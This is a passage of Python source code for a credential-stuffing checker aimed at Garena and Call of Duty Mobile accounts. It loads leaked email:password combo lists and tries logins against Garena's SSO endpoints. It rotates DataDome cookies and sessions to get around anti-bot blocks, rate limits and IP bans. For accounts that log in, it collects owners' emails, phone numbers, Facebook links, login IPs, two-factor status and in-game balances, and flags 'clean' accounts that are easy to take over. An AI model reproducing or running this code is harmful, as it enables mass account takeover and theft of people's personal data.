        conn = psycopg2.connect(self.remote_url)
        cur = conn.cursor()
        cur.execute('SELECT combo, checked_at FROM checked_accounts WHERE combo = %s', (combo,))
        result = cur.fetchone()
        conn.close()
        if result:
            return {'leaked': True, 'combo': result[0], 'checked_at': result[1]}
        return {'leaked': False, 'combo': combo}
    
    def _check_local(self, combo):
        conn = sqlite3.connect(self.local_db)
        cur = conn.cursor()
        cur.execute('SELECT combo, checked_at FROM checked_accounts WHERE combo = ?', (combo,))
        result = cur.fetchone()
        conn.close()
        if result:
            return {'leaked': True, 'combo': result[0], 'checked_at': result[1]}
        return {'leaked': False, 'combo': combo}
    
    def search_leaks(self, combo_file_path=None, single_combo=None):
        if self.remote_available:
            try:
                return self._search_remote(combo_file_path, single_combo)
            except:
                return self._search_local(combo_file_path, single_combo)
        return self._search_local(combo_file_path, single_combo)
    
    def _search_remote(self, combo_file_path=None, single_combo=None):
        import psycopg2
        
        combos_to_check = []
        if single_combo:
            combos_to_check = [single_combo.strip()]
        elif combo_file_path:
            with open(combo_file_path, 'r', encoding='utf-8', errors='ignore') as f:
                combos_to_check = [l.strip() for l in f.readlines() if l.strip() and ':' in l]
        
        if not combos_to_check:
            return None
        
        conn = psycopg2.connect(self.remote_url)
        cur = conn.cursor()
        
        found_leaks = []
        not_found = []
        
        for combo in combos_to_check:
            cur.execute('SELECT combo, checked_at FROM checked_accounts WHERE combo = %s', (combo,))
            result = cur.fetchone()
            if result:
                found_leaks.append({'combo': result[0], 'checked_at': result[1]})
            else:
                not_found.append(combo)
        
        conn.close()
        
        return {
            'total': len(combos_to_check),
            'leaked': len(found_leaks),
            'fresh': len(not_found),
            'leaked_list': found_leaks,
            'fresh_list': not_found
        }
    
    def _search_local(self, combo_file_path=None, single_combo=None):
        combos_to_check = []
        if single_combo:
            combos_to_check = [single_combo.strip()]
        elif combo_file_path:
            with open(combo_file_path, 'r', encoding='utf-8', errors='ignore') as f:
                combos_to_check = [l.strip() for l in f.readlines() if l.strip() and ':' in l]
        
        if not combos_to_check:
            return None
        
        conn = sqlite3.connect(self.local_db)
        cur = conn.cursor()
        
        found_leaks = []
        not_found = []
        
        for combo in combos_to_check:
            cur.execute('SELECT combo, checked_at FROM checked_accounts WHERE combo = ?', (combo,))
            result = cur.fetchone()
            if result:
                found_leaks.append({'combo': result[0], 'checked_at': result[1]})
            else:
                not_found.append(combo)
        
        conn.close()
        
        return {
            'total': len(combos_to_check),
            'leaked': len(found_leaks),
            'fresh': len(not_found),
            'leaked_list': found_leaks,
            'fresh_list': not_found
        }

class AccountFileManager:
    def __init__(self, combo_folder='Combo'):
        self.combo_folder = Path(combo_folder)
        self.combo_folder.mkdir(exist_ok=True)
        self._file_lock = threading.Lock()

    def scan_combo_folder(self):
        return list(self.combo_folder.glob('*.txt'))

    def get_file_info(self, file_path):
        file_path = Path(file_path)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [line.strip() for line in f if line.strip() and ':' in line]
                account_count = len(lines)
            file_size = file_path.stat().st_size
            return {'name': file_path.name, 'path': str(file_path), 'size': file_size, 'size_str': self._format_size(file_size), 'account_count': account_count}
        except Exception as e:
            logger.error(f'Error reading file {file_path}')
            return None

    def _format_size(self, size_bytes):
        for unit in ['B', 'KB', 'MB', 'GB']:
            if size_bytes < 1024.0:
                return f'{size_bytes:.2f} {unit}'
            size_bytes /= 1024.0
        return f'{size_bytes:.2f} TB'

    def clean_file_encoding(self, file_path):
        file_path = Path(file_path)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
            cleaned_lines = []
            invalid_count = 0
            for line in lines:
                account, password = clean_account_line(line)
                if account and password:
                    cleaned_lines.append(f'{account}:{password}\n')
                else:
                    invalid_count += 1
            with open(file_path, 'w', encoding='utf-8') as f:
                f.writelines(cleaned_lines)
            return (len(cleaned_lines), invalid_count)
        except Exception as e:
            logger.error(f'Error cleaning file encoding')
            return (0, 0)

    def clean_duplicates(self, file_path, overwrite=True):
        file_path = Path(file_path)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [line.strip() for line in f if line.strip()]
            original_count = len(lines)
            unique_lines = list(dict.fromkeys(lines))
            duplicates_removed = original_count - len(unique_lines)
            if overwrite:
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(unique_lines))
            else:
                new_path = file_path.parent / f'{file_path.stem}_cleaned.txt'
                with open(new_path, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(unique_lines))
            return duplicates_removed
        except Exception as e:
            logger.error(f'Error cleaning duplicates')
            return 0

    def remove_line_from_file(self, file_path, line_to_remove):
        try:
            file_path = Path(file_path)
            target = line_to_remove.strip()
            with self._file_lock:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = f.readlines()
                with open(file_path, 'w', encoding='utf-8') as f:
                    for line in lines:
                        if line.strip() != target:
                            f.write(line)
            return True
        except Exception as e:
            logger.error(f'Error removing line')
            return False


from collections import deque
import threading
import time
import re

class LiveStats:
    def __init__(self):
        self.valid_count = 0
        self.invalid_count = 0
        self.clean_count = 0
        self.not_clean_count = 0
        self.has_codm_count = 0
        self.no_codm_count = 0
        self.error_count = 0
        
        self.highest_clean_level = 0
        self.highest_nc_level = 0
        self.highest_shell = 0
        

        self.clean_level_counts = {'351-400': 0, '201-350': 0, '101-200': 0, '1-100': 0}
        self.not_clean_level_counts = {'351-400': 0, '201-350': 0, '101-200': 0, '1-100': 0}
        self.level_distribution = {"1-50": 0, "51-100": 0, "101-150": 0, "151-200": 0, 
                                  "201-250": 0, "251-300": 0, "301-350": 0, "351-400": 0}
        self.categorized_levels = {"1-49": 0, "50-99": 0, "100-199": 0, "200-299": 0, "300-400": 0}
        

        self.country_distribution = {}
        self.region_distribution = {}  
        self.countries = []
        self.regions = []
        
        self.lock = threading.Lock()
        self.start_time = time.time()
        self.total_accounts = 0
        
        self.game_counts = {}
        self.last_result_queue = deque(maxlen=200)
        self.valid_hits = []
        

        self.current_account = ""

    def _categorize_level(self, level, is_clean=False):
        """Helper to categorize levels consistently"""
        try:
            lvl = int(level)
            if lvl <= 0:
                return
            

            if is_clean:
                if lvl <= 100: self.clean_level_counts["1-100"] += 1
                elif lvl <= 200: self.clean_level_counts["101-200"] += 1
                elif lvl <= 350: self.clean_level_counts["201-350"] += 1
                else: self.clean_level_counts["351-400"] += 1
            else:
                if lvl <= 100: self.not_clean_level_counts["1-100"] += 1
                elif lvl <= 200: self.not_clean_level_counts["101-200"] += 1
                elif lvl <= 350: self.not_clean_level_counts["201-350"] += 1
                else: self.not_clean_level_counts["351-400"] += 1
            

            if lvl <= 50: self.level_distribution["1-50"] += 1
            elif lvl <= 100: self.level_distribution["51-100"] += 1
            elif lvl <= 150: self.level_distribution["101-150"] += 1
            elif lvl <= 200: self.level_distribution["151-200"] += 1
            elif lvl <= 250: self.level_distribution["201-250"] += 1
            elif lvl <= 300: self.level_distribution["251-300"] += 1
            elif lvl <= 350: self.level_distribution["301-350"] += 1
            else: self.level_distribution["351-400"] += 1

            if 1 <= lvl <= 49: self.categorized_levels["1-49"] += 1
            elif 50 <= lvl <= 99: self.categorized_levels["50-99"] += 1
            elif 100 <= lvl <= 199: self.categorized_levels["100-199"] += 1
            elif 200 <= lvl <= 299: self.categorized_levels["200-299"] += 1
            elif 300 <= lvl <= 400: self.categorized_levels["300-400"] += 1
            
        except (ValueError, TypeError):
            pass

    def update_stats(self, valid=False, clean=False, has_codm=False, is_error=False, 
                    codm_level=0, game_connections=None, shell=0, country="N/A", region="N/A"):
        with self.lock:
            if is_error:
                self.error_count += 1
                return
            
            if not valid:
                self.invalid_count += 1
                return
            
            self.valid_count += 1
            
            if clean:
                self.clean_count += 1
            else:
                self.not_clean_count += 1
            
            if has_codm:
                self.has_codm_count += 1
            else:
                self.no_codm_count += 1
            
            try:
                lvl = int(codm_level) if codm_level else 0
                shell = int(shell or 0)
            except:
                lvl, shell = 0, 0
            

            if lvl > 0:
                if clean and lvl > self.highest_clean_level:
                    self.highest_clean_level = lvl
                if not clean and lvl > self.highest_nc_level:
                    self.highest_nc_level = lvl
                self._categorize_level(lvl, clean)
            
            if shell > self.highest_shell:
                self.highest_shell = shell
            

            if country and country != "N/A" and country != "None" and country != "":
                country_clean = re.sub(r'[^A-Za-z]', '', str(country)).upper()
                if country_clean and len(country_clean) >= 2:
                    self.country_distribution[country_clean] = self.country_distribution.get(country_clean, 0) + 1
                    self.countries.append(country_clean)
            

            if region and region != "N/A" and region != "None" and region != "":
                region_clean = re.sub(r'[^A-Za-z]', '', str(region)).upper()
                if region_clean and len(region_clean) >= 2:
                    self.region_distribution[region_clean] = self.region_distribution.get(region_clean, 0) + 1
                    self.regions.append(region_clean)
            elif has_codm and lvl > 0:

                if country and country != "N/A":
                    region_clean = re.sub(r'[^A-Za-z]', '', str(country)).upper()
                    if region_clean and len(region_clean) >= 2:
                        self.region_distribution[region_clean] = self.region_distribution.get(region_clean, 0) + 1
                        self.regions.append(region_clean)
            

            for g in (game_connections or []):
                game = g.get("game", "").upper()
                if game == "FREE FIRE":
                    game = "FREEFIRE"
                if game in self.game_counts:
                    self.game_counts[game] += 1
                else:
                    self.game_counts[game] = 1

    def get_stats(self):
        with self.lock:
            elapsed = time.time() - self.start_time
            checked = self.valid_count + self.invalid_count + self.error_count
            progress = (checked / self.total_accounts * 100) if self.total_accounts else 0
            
            return {
                "valid": self.valid_count,
                "invalid": self.invalid_count,
                "clean": self.clean_count,
                "not_clean": self.not_clean_count,
                "has_codm": self.has_codm_count,
                "no_codm": self.no_codm_count,
                "error": self.error_count,
                "highest_clean_level": self.highest_clean_level,
                "highest_shell": self.highest_shell,
                "clean_level_counts": dict(self.clean_level_counts),
                "not_clean_level_counts": dict(self.not_clean_level_counts),
                "level_distribution": dict(self.level_distribution),
                "categorized_levels": dict(self.categorized_levels),
                "country_distribution": dict(self.country_distribution),
                "region_distribution": dict(self.region_distribution),  # <-- NEW
                "game_counts": dict(self.game_counts),
                "checked": checked,
                "total": self.total_accounts,
                "elapsed": elapsed,
                "progress": progress,
                "high_lvl": self.highest_clean_level,
                "high_shell": self.highest_shell
            }

    def get_processed_count(self):
        with self.lock:
            return self.valid_count + self.invalid_count + self.error_count

    def push_result(self, success, is_clean=False, has_codm=False, codm_level=0, error_reason=""):
        with self.lock:
            self.last_result_queue.append({
                "success": success,
                "is_clean": is_clean,
                "has_codm": has_codm,
                "codm_level": codm_level,
                "error_reason": error_reason
            })

    def pop_result(self):
        with self.lock:
            return self.last_result_queue.popleft() if self.last_result_queue else None

    def add_hit(self, level, text):
        with self.lock:
            self.valid_hits.append({"level": level, "text": text})

    def add_codm_details(self, level, country, region=None):
        """Legacy method - maintained for compatibility"""
        with self.lock:
            if country and country != 'N/A':
                country_clean = re.sub(r'[^A-Za-z]', '', str(country)).upper()
                if country_clean and len(country_clean) >= 2:
                    self.countries.append(country_clean)
            
            if region and region != 'N/A':
                region_clean = re.sub(r'[^A-Za-z]', '', str(region)).upper()
                if region_clean and len(region_clean) >= 2:
                    self.regions.append(region_clean)
                    self.region_distribution[region_clean] = self.region_distribution.get(region_clean, 0) + 1
            elif country and country != 'N/A':

                country_clean = re.sub(r'[^A-Za-z]', '', str(country)).upper()
                if country_clean and len(country_clean) >= 2:
                    self.region_distribution[country_clean] = self.region_distribution.get(country_clean, 0) + 1
                    self.regions.append(country_clean)
            
            self._categorize_level(level)

    def update_highest(self, shells, level, is_clean=None):
        """Legacy method - maintained for compatibility"""
        with self.lock:
            try:
                s = int(float(str(shells).strip())) if shells else 0
                if s > self.highest_shell:
                    self.highest_shell = s
            except:
                pass
            try:
                l = int(float(str(level).strip())) if level else 0
                if is_clean is True and l > self.highest_clean_level:
                    self.highest_clean_level = l
                elif is_clean is False and l > self.highest_nc_level:
                    self.highest_nc_level = l
                elif l > self.highest_clean_level:
                    self.highest_clean_level = l
            except:
                pass
                
_auto_remove_queue = []
_auto_remove_lock = threading.Lock()
_auto_remove_batch = 50

def _flush_auto_remove(file_manager, combo_file_path, force=False):
    with _auto_remove_lock:
        if not _auto_remove_queue:
            return
        if not force and len(_auto_remove_queue) < _auto_remove_batch:
            return
        batch = list(_auto_remove_queue)
        _auto_remove_queue.clear()
    if not batch:
        return
    target_set = set((b.strip() for b in batch))
    try:
        fp = Path(combo_file_path)
        with file_manager._file_lock:
            with open(fp, 'r', encoding='utf-8', errors='ignore') as fh:
                lines = fh.readlines()
            with open(fp, 'w', encoding='utf-8') as fh:
                for line in lines:
                    if line.strip() not in target_set:
                        fh.write(line)
    except Exception:
        pass

def _queue_auto_remove(account, password, file_manager, combo_file_path):
    with _auto_remove_lock:
        _auto_remove_queue.append(f'{account}:{password}')
    if len(_auto_remove_queue) >= _auto_remove_batch:
        threading.Thread(target=_flush_auto_remove, args=(file_manager, combo_file_path), daemon=True).start()

def processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, results_manager, file_manager, combo_file_path, auto_remove, use_elegant_display=False, suppress_print=False, proxy_manager=None):
    max_retries = 2
    attempt = 0

    def display_info(acc, pwd, det, codm, has, error_reason=None, gc=None):
        if suppress_print:
            return
        if use_elegant_display:
            display_codm_info_elegant(acc, pwd, det, codm, has, error_reason, gc)
        else:
            display_codm_info(acc, pwd, det, codm, has, error_reason, gc)

    while True:
        attempt += 1
        try:
            session.cookies.clear()
            init_ga_cookies(session)
            datadome_manager.clear_session_datadome(session)
            current_datadome = datadome_manager.get_datadome()
            if current_datadome:
                datadome_manager.set_session_datadome(session, current_datadome)
            else:
                saved = cookie_manager.get_valid_cookies()
                if saved:
                    picked = random.choice(saved)
                    val = picked.split('=', 1)[1] if '=' in picked else picked
                    datadome_manager.set_datadome(val)
                    datadome_manager.set_session_datadome(session, val)
                else:
                    proxy_dict = dict(session.proxies) if hasattr(session, 'proxies') and session.proxies else None
                    datadome = get_datadome_cookie(session, proxies=proxy_dict)
                    if datadome:
                        datadome_manager.set_datadome(datadome)
                        datadome_manager.set_session_datadome(session, datadome)
            v1, v2, new_datadome = prelogin(session, account, datadome_manager, cookie_manager, proxy_manager=proxy_manager)
            if v1 == 'IP_BLOCKED':
                if datadome_manager.wait_for_ip_change(session):
                    session.close()
                    session = requests.Session()
                    session.cookies.clear()
                    init_ga_cookies(session)
                    datadome_manager.clear_session_datadome(session)
                    return ('IP_CHANGED', None)
                else:
                    live_stats.update_stats(is_error=True)
                    account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'IP Change Timeout'}
                    results_manager.add_account(account_data)
                    if auto_remove:
                        _queue_auto_remove(account, password, file_manager, combo_file_path)
                    return ('ERROR', account_data)
            if not v1 or not v2:
                live_stats.update_stats(valid=False)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': "Account Doesn't Exist"}
                results_manager.add_account(account_data)
                live_stats.push_result(success=False, error_reason="Account Doesn't Exist")
                display_info(account, password, None, None, False, error_reason="Account Doesn't Exist!")
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return ('ERROR', account_data)
            if new_datadome:
                datadome_manager.set_datadome(new_datadome)
                datadome_manager.set_session_datadome(session, new_datadome)
            sso_key = login(session, account, password, v1, v2)
            if not sso_key:
                live_stats.update_stats(valid=False)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Invalid Credentials'}
                results_manager.add_account(account_data)
                live_stats.push_result(success=False, error_reason='Wrong Password')
                display_info(account, password, None, None, False, error_reason='Incorrect Password')
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return ('ERROR', account_data)
            if isinstance(sso_key, str) and sso_key.startswith('permanent_fail:'):
                reason = sso_key.split(':', 1)[1]
                live_stats.update_stats(valid=False)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': reason}
                results_manager.add_account(account_data)
                display_info(account, password, None, None, False, error_reason=reason)
                if auto_remove:
                    file_manager.remove_line_from_file(combo_file_path, f'{account}:{password}')
                return ('ERROR', account_data)
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            for cookie_name in ['apple_state_key', 'datadome', 'sso_key', '_ga', '_ga_XB5PSHEQB4', '_ga_1M7M9L6VPX']:
                if cookie_name in current_cookies:
                    cookie_parts.append(f'{cookie_name}={current_cookies[cookie_name]}')
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
            headers = {'accept': '*/*', 'referer': 'https://account.garena.com/', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'}
            if cookie_header:
                headers['cookie'] = cookie_header
            response = session.get('https://account.garena.com/api/account/init', headers=headers, timeout=12)
            if response.status_code == 403:
                bad_cookie = session.cookies.get('datadome') or datadome_manager.get_datadome()
                if bad_cookie:
                    cookie_manager.mark_banned(bad_cookie)
                if datadome_manager.handle_403(session):
                    if attempt < max_retries:
                        if not suppress_print:
                            print(f'  {YELLOW}⚠  403 error, retrying ({attempt}/{max_retries}){RESET}')
                        continue
                live_stats.update_stats(is_error=True)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Cookie Banned/IP Blocked'}
                results_manager.add_account(account_data)
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return ('ERROR', account_data)
            try:
                account_data_json = response.json()
            except json.JSONDecodeError:
                if attempt < max_retries:
                    if not suppress_print:
                        print(f'  {YELLOW}⚠  Invalid response, retrying ({attempt}/{max_retries}){RESET}')
                    time.sleep(2)
                    continue
                live_stats.update_stats(is_error=True)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Invalid Server Response'}
                results_manager.add_account(account_data)
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return ('ERROR', account_data)
            if 'error_auth' in account_data_json:
                live_stats.update_stats(valid=False)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Incorrect Password'}
                results_manager.add_account(account_data)
                display_info(account, password, None, None, False, error_reason='Incorrect Password')
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return ('ERROR', account_data)
            if 'error' in account_data_json:
                error_msg = account_data_json.get('error')
                if error_msg == 'ACCOUNT DOESNT EXIST':
                    live_stats.update_stats(valid=False)
                    account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': "Account Doesn't Exist"}
                    results_manager.add_account(account_data)
                    display_info(account, password, None, None, False, error_reason="Account Doesn't Exist!")
                    if auto_remove:
                        file_manager.remove_line_from_file(combo_file_path, f'{account}:{password}')
                    return ('ERROR', account_data)
                else:
                    live_stats.update_stats(is_error=True)
                    account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': error_msg}
                    results_manager.add_account(account_data)
                    display_info(account, password, None, None, False, error_reason=error_msg)
                    if auto_remove:
                        file_manager.remove_line_from_file(combo_file_path, f'{account}:{password}')
                    return ('ERROR', account_data)
            if 'user_info' in account_data_json:
                details = parse_account_details(account_data_json)
                details['login_history'] = account_data_json.get('login_history', [])
            else:
                details = parse_account_details({'user_info': account_data_json})
            codm_session = requests.Session()
            for cookie_name in ['sso_key', 'apple_state_key', 'datadome']:
                if cookie_name in session.cookies:
                    codm_session.cookies.set(cookie_name, session.cookies.get(cookie_name), domain='.garena.com')
            has_codm, codm_info = check_codm_account(codm_session, account)
            codm_session.close()
            game_connections = []
            if CHECK_OTHER_GAMES:
                try:
                    game_connections = get_game_connections(session, account)
                except Exception as _ge:
                    logger.warning(f'[GAMES] Failed for {account}: {_ge}')
            fresh_datadome = datadome_manager.extract_datadome_from_session(session)
            if fresh_datadome:
                cookie_manager.save_cookie(fresh_datadome)
            mobile_no = details['personal'].get('mobile_no', 'N/A')
            country_code = details['personal'].get('country_code', 'N/A')
            formatted_mobile = format_mobile_number(mobile_no, country_code)
            email = details.get('email', 'N/A')
            email_verified = details.get('email_verified', False)
            if email and email != 'N/A' and ('@' in email):
                verification_status = '(Verified)' if email_verified else '(Not Verified)'
                email_display = f'{email} {verification_status}'
            else:
                email_display = 'N/A'
            fb_username = details['facebook'].get('fb_username', 'N/A')
            fb_uid = details['facebook'].get('fb_uid', 'N/A')
            if fb_uid != 'N/A' and fb_uid:
                fb_link = f'https://www.facebook.com/profile.php?id={fb_uid}'
            else:
                fb_link = 'N/A'
            if fb_uid == 'N/A' or not fb_uid:
                fb_info = 'NOT CONNECTED'
            elif not fb_username or fb_username == 'N/A':
                fb_info = 'FB UNBIND or FB DELETED'
            else:
                fb_info = 'CONNECTED'
            login_history = details.get('login_history', [])
            last_login_info = login_history[0] if login_history else {}
            last_login = last_login_info.get('timestamp', 0)
            last_login_date = time.strftime('%B %d, %Y | %I:%M %p', time.localtime(last_login)) if last_login else 'N/A'
            last_login_where = f"{last_login_info.get('source', 'Unknown')}" if last_login_info else 'Unknown'
            last_login_ip = last_login_info.get('ip', 'N/A') if last_login_info else 'N/A'
            last_login_country = last_login_info.get('country', 'N/A') if last_login_info else 'N/A'
            

            country = details['personal'].get('country', 'N/A')
            region = codm_info.get('region', 'N/A') if has_codm and codm_info else 'N/A'
            

            if region == 'N/A' and country != 'N/A':
                region = country
            
            account_data = {
                'account': account,
                'password': password,
                'uid': details.get('uid', 'N/A'),
                'username': details.get('username', 'N/A'),
                'nickname': details.get('nickname', 'N/A'),
                'email': details.get('email', 'N/A'),
                'email_verified': details.get('email_verified', False),
                'email_display': email_display,
                'formatted_mobile': formatted_mobile,
                'country': country,
                'region': region,  # <-- ADDED
                'shell_balance': details['profile'].get('shell_balance', 0),
                'account_status': details['status'].get('account_status', 'N/A'),
                'fb_username': fb_username,
                'fb_uid': fb_uid,
                'fb_link': fb_link,
                'fb_info': fb_info,
                'bind_status': details.get('bind_status', 'N/A'),
                'is_clean': details.get('is_clean', False),
                'has_codm': has_codm,
                'is_error': False,
                'last_login_date': last_login_date,
                'last_login_where': last_login_where,
                'last_login_ip': last_login_ip,
                'last_login_country': last_login_country,
                'two_step_verify': details['security'].get('two_step_verify', False),
                'authenticator_app': details['security'].get('authenticator_app', False),
                'game_connections': game_connections or []
            }
            if has_codm and codm_info:
                account_data.update({
                    'codm_level': int(codm_info.get('codm_level', 0)),
                    'codm_region': codm_info.get('region', 'N/A'),
                    'codm_nickname': codm_info.get('codm_nickname', 'N/A'),
                    'codm_uid': codm_info.get('uid', 'N/A'),
                    'region_code': codm_info.get('region_code', 'N/A')
                })
            else:
                account_data.update({
                    'codm_level': 0,
                    'codm_region': 'N/A',
                    'codm_nickname': 'N/A',
                    'codm_uid': 'N/A',
                    'region_code': 'N/A'
                })
            results_manager.add_account(account_data)
            codm_level = account_data.get('codm_level', 0)
            

            live_stats.update_stats(
                valid=True, 
                clean=details['is_clean'], 
                has_codm=has_codm, 
                codm_level=codm_level, 
                game_connections=game_connections, 
                shell=details['profile'].get('shell_balance', 0),
                country=country,
                region=region  # <-- ADDED
            )
            live_stats.update_highest(details['profile'].get('shell_balance', 0), codm_level, details['is_clean'])
            if has_codm:

                live_stats.add_codm_details(codm_level, country, region)  # <-- ADDED region
            live_stats.push_result(success=True, is_clean=details['is_clean'], has_codm=has_codm, codm_level=codm_level)
            if CHECK_OTHER_GAMES and game_connections:
                save_game_folder(account, password, account_data, game_connections, results_manager.base_dir)
            display_info(account, password, details, codm_info, has_codm, gc=game_connections)
            if auto_remove:
                file_manager.remove_line_from_file(combo_file_path, f'{account}:{password}')
            return ('DONE', account_data)
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            session.cookies.clear()
            if attempt < max_retries:
                if not suppress_print:
                    print(f'  {YELLOW}⚠  Connection/Timeout error, retrying ({attempt}/{max_retries}){RESET}')
                time.sleep(3)
                continue
            else:
                live_stats.update_stats(is_error=True)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Connection/Timeout Error'}
                results_manager.add_account(account_data)
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return ('ERROR', account_data)
        except Exception as e:
            if attempt < max_retries:
                time.sleep(2)
                continue
            else:
                logger.error(f'[ERROR] Unexpected error processing {account}')
                live_stats.update_stats(is_error=True)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': f'Unexpected Error: {str(e)}'}
                results_manager.add_account(account_data)
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return ('ERROR', account_data)

def _get_sess():
    if not hasattr(_tl, "s"):
        s = requests.Session()
        dm = DataDomeManager()
        

        init_ga_cookies(s)
        
        cks = cookie_manager_val.get_valid_cookies()
        
        if cks:
            applyck(s, "; ".join(cks))
            for part in cks[-1].split(";"):
                part = part.strip()
                if part.startswith("datadome="):
                    dd_value = part.split("=", 1)[1].strip()
                    dm.set_datadome(dd_value)
                    dm.set_session_datadome(s, dd_value)
                    break
        else:
            dd = get_datadome_cookie(s, proxies=dict(s.proxies) if s.proxies else None)
            if dd:
                dm.set_datadome(dd)
                dm.set_session_datadome(s, dd)
        
        _tl.s, _tl.dm = s, dm
    return _tl.s, _tl.dm

def _prelogin_no_ip_wait(session, account, datadome_manager, max_retries=3):
    url = 'https://sso.garena.com/api/prelogin'
    
    for attempt in range(max_retries):
        try:
            init_ga_cookies(session)
            
            current_dd = session.cookies.get('datadome')
            if not current_dd:
                current_dd = datadome_manager.get_datadome()
                if current_dd:
                    datadome_manager.set_session_datadome(session, current_dd)
            
            params = {
                'app_id': '10100', 
                'account': account, 
                'format': 'json', 
                'id': str(int(time.time() * 1000))
            }
            
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            for name in ['apple_state_key', 'datadome', 'sso_key', '_ga', '_ga_XB5PSHEQB4']:
                if name in current_cookies:
                    cookie_parts.append(f'{name}={current_cookies[name]}')
            
            headers = {
                "Host": "sso.garena.com",
                "Connection": "keep-alive",
                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                "Accept": "application/json, text/plain, */*",
                "sec-ch-ua-mobile": "?1",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
                "sec-ch-ua-platform": '"Android"',
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-PH",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-PH,en-US;q=0.9,en;q=0.8",
            }
            
            if cookie_parts:
                headers['cookie'] = '; '.join(cookie_parts)
            
            resp = session.get(url, headers=headers, params=params, timeout=10)
            
            new_dd = resp.cookies.get('datadome')
            if new_dd:
                datadome_manager.set_datadome(new_dd)
                datadome_manager.set_session_datadome(session, new_dd)
            
            if resp.status_code == 403:
                _log('WARNING', f'403 on prelogin, refreshing datadome (attempt {attempt+1}/{max_retries})')
                

                fresh_dd = get_datadome_cookie(session)
                if fresh_dd:
                    datadome_manager.set_datadome(fresh_dd)
                    datadome_manager.set_session_datadome(session, fresh_dd)
                    time.sleep(1)
                    continue
                

                _log('WARNING', 'Failed to get fresh datadome, trying without it...')
                session.cookies.pop('datadome', None)
                time.sleep(2)
                continue
            
            if resp.status_code == 429:
                _log('WARNING', 'Rate limited, waiting...')
                time.sleep(3)
                continue
            
            resp.raise_for_status()
            data = resp.json()
            
            if 'error' in data:
                error_msg = data.get('error', 'Unknown error')
                if error_msg == 'ACCOUNT DOESNT EXIST':
                    return (None, None, None)
                return (None, None, None)
            
            v1 = data.get('v1')
            v2 = data.get('v2')
            
            if not v1 or not v2:
                return (None, None, None)
            
            return (v1, v2, new_dd)
            
        except requests.exceptions.RequestException:
            if attempt < max_retries - 1:
                time.sleep(1)
            continue
        except Exception:
            if attempt < max_retries - 1:
                time.sleep(0.5)
            continue
    
    return (None, None, None)

def _check_one(acc_pw):
    if stop_ev.is_set():
        return
    
    account, password = acc_pw
    result, note = "error", ""
    
    try:
        session, dm = _get_sess()
        

        session.cookies.clear()
        init_ga_cookies(session)
        

        dd = dm.get_datadome()
        if dd:
            dm.set_session_datadome(session, dd)
        else:
            fresh_dd = get_datadome_cookie(session)
            if fresh_dd:
                dm.set_datadome(fresh_dd)
                dm.set_session_datadome(session, fresh_dd)
        

        v1, v2 = None, None
        for prelogin_attempt in range(3):
            v1, v2, _ = _prelogin_no_ip_wait(session, account, dm, max_retries=2)
            if v1 and v2:
                break
            

            _log('WARNING', f'Prelogin attempt {prelogin_attempt+1} failed, refreshing session...')
            session.cookies.clear()
            init_ga_cookies(session)
            
            fresh_dd = get_datadome_cookie(session)
            if fresh_dd:
                dm.set_datadome(fresh_dd)
                dm.set_session_datadome(session, fresh_dd)
            
            time.sleep(2)
        
        if not v1 or not v2:
            result, note = "invalid", "Account Not Found"
        else:
            
            sso_key = None
            for login_attempt in range(2):
                sso_key = login(session, account, password, v1, v2)
                if sso_key and not isinstance(sso_key, str):
                    break
                if isinstance(sso_key, str) and sso_key.startswith('permanent_fail:'):
                    break
                time.sleep(1)
            
            if sso_key and not isinstance(sso_key, str):
                result, note = "valid", ""
            elif isinstance(sso_key, str) and sso_key.startswith('permanent_fail:'):
                result, note = "invalid", "Account Issue"
            else:
                result, note = "invalid", "Incorrect Password"
                
    except requests.exceptions.ConnectionError:
        result, note = "error", "Connection Error"
    except requests.exceptions.Timeout:
        result, note = "error", "Timeout"
    except Exception as e:
        result, note = "error", str(e)[:30]
    
    # Save results
    with file_lock:
        if result == "valid":
            valid_fh.write(f"{account}:{password}\n")
        elif result == "invalid":
            invalid_fh.write(f"{account}:{password}\n")
        else:
            error_fh.write(f"{account}:{password} | {note}\n")
    
    with st_lock:
        vl[result] += 1
